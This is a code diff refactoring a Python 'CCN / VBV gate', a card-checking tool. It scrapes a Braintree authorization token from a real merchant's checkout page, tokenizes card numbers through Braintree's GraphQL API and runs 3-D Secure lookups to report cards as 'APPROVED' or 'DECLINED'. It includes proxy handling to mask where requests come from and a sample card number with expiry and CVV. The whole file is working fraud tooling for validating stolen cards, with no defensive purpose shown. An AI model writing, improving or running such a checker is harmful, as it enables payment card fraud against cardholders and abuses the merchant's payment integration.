@@ -1,3 +1,6 @@
+"""
+Braintree CCN / VBV Engine - Standalone Gate Module
+"""
 import aiohttp
 import re
 import json
@@ -6,9 +9,27 @@ import random
 import asyncio
 import time
 
-# Cache the authorization fingerprint to avoid re-scraping the huge checkout page
+# Cache the authorization fingerprint to avoid re-scraping the checkout page
 _cached_fingerprint = None
 _cache_expiry = 0
+
+def _format_proxy(p):
+    if not p:
+        return None
+    ps = str(p).strip()
+    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
+        return ps
+    parts = ps.split(":")
+    if len(parts) == 4:
+        if parts[1].isdigit():
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif parts[3].isdigit():
+            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+        else:
+            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    elif len(parts) == 2:
+        return f"http://{parts[0]}:{parts[1]}"
+    return f"http://{ps}"
 
 async def _get_auth_fingerprint(session, proxy_url=None):
     """Fetch and cache the Braintree authorization fingerprint."""
@@ -30,7 +51,7 @@ async def _get_auth_fingerprint(session, proxy_url=None):
         try:
             async with session.get('https://www.makistamps.com/checkout/', headers=headers) as r:
                 resp_text = await r.text()
-        except Exception as e:
+        except Exception:
             return None
     
     match = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', resp_text)
@@ -43,31 +64,18 @@ async def _get_auth_fingerprint(session, proxy_url=None):
         fp = data.get("authorizationFingerprint")
         if fp:
             _cached_fingerprint = fp
-            _cache_expiry = now + 1500  # Cache for 25 minutes (token expires in ~30min)
+            _cache_expiry = now + 1500  # Cache for 25 minutes
         return fp
     except Exception:
         return None
 
 
-async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
+async def check_card_brccn(cc, mm, yy, cvc, proxy_url=None):
     """
-    Braintree GraphQL + 3DS Lookup.
+    Braintree CCN / VBV Engine.
     Returns: (is_live, message, response_text, receipt_url, amount)
     """
-    def _format_proxy(p):
-        if not p: return None
-        ps = str(p).strip()
-        if ps.startswith(("http://", "https://", "socks5://", "socks4://")): return ps
-        parts = ps.split(":")
-        if len(parts) == 4:
-            if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
-            else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-        elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
-        return f"http://{ps}"
-
     proxy_url = _format_proxy(proxy_url)
-
 
     if len(yy) == 2:
         yy = "20" + yy
@@ -81,12 +89,12 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
     try:
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             
-            # 1. Get cached fingerprint (fast path) or scrape it
+            # 1. Get cached fingerprint
             authorization_fingerprint = await _get_auth_fingerprint(session, proxy_url)
             if not authorization_fingerprint:
                 return False, "Failed to get Braintree Auth Token", "", None, "Auth ($0.00)"
 
-            # 2. Tokenize via GraphQL (direct, no delay)
+            # 2. Tokenize via GraphQL
             headers_gql = {
                 'authorization': f'Bearer {authorization_fingerprint}',
                 'braintree-version': '2018-05-10',
@@ -101,7 +109,7 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
                     'integration': 'dropin2',
                     'sessionId': '2d64cb82-f1a4-4084-bdd8-63df2991eadb',
                 },
-                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                 'variables': {
                     'input': {
                         'creditCard': {
@@ -125,7 +133,6 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
                     
             try:
                 tokencc = gql_resp["data"]["tokenizeCreditCard"]["token"]
-                # Extract BIN data from tokenize response
                 card_data = gql_resp["data"]["tokenizeCreditCard"].get("creditCard", {})
                 bin_data = card_data.get("binData", {})
             except Exception:
@@ -134,7 +141,7 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
                     return False, f"Tokenize Failed: {err}", str(gql_resp), None, "Auth ($0.00)"
                 return False, "Failed to tokenize card", str(gql_resp), None, "Auth ($0.00)"
 
-            # 3. 3DS Lookup (direct, no delay)
+            # 3. 3DS Lookup
             headers_lookup = {
                 'content-type': 'application/json',
                 'origin': 'https://www.makistamps.com',
@@ -200,9 +207,7 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
                 statuscc = res_json["paymentMethod"]["threeDSecureInfo"]["status"]
                 card_details = res_json.get("paymentMethod", {}).get("details", {})
                 card_type = card_details.get("cardType", "Unknown")
-                last_four = card_details.get("lastFour", "????")
                 
-                # Build BIN info dict for output
                 bin_info = {
                     "bin": bin_number,
                     "card_type": card_type,
@@ -234,15 +239,17 @@ async def process_braintree_vbv(cc, mm, yy, cvc, proxy_url=None):
         return False, f"Error: {str(e)}", "", None, "Auth ($0.00)"
 
 
-process_braintree_ccn = process_braintree_vbv
+# Aliases for backward compatibility
+process_braintree_vbv = check_card_brccn
+process_braintree_ccn = check_card_brccn
 
 
 if __name__ == '__main__':
     import sys
     test_card = sys.argv[1] if len(sys.argv) > 1 else "4833160315600632|09|2030|000"
-    p = test_card.split('|')
-    print(f"[*] Standalone Debugging Braintree Engine on: {test_card}")
-    is_live, msg, raw_resp, _, amt = asyncio.run(process_braintree_ccn(p[0], p[1], p[2], p[3]))
+    parts = test_card.split('|')
+    print(f"[*] Standalone Debugging brccn.py on: {test_card}")
+    is_live, msg, raw_resp, _, amt = asyncio.run(check_card_brccn(parts[0], parts[1], parts[2], parts[3]))
     print(f"[+] Status: {'APPROVED' if is_live else 'DECLINED'}")
     print(f"[+] Message: {msg}")
     print(f"[+] Details: {raw_resp}")
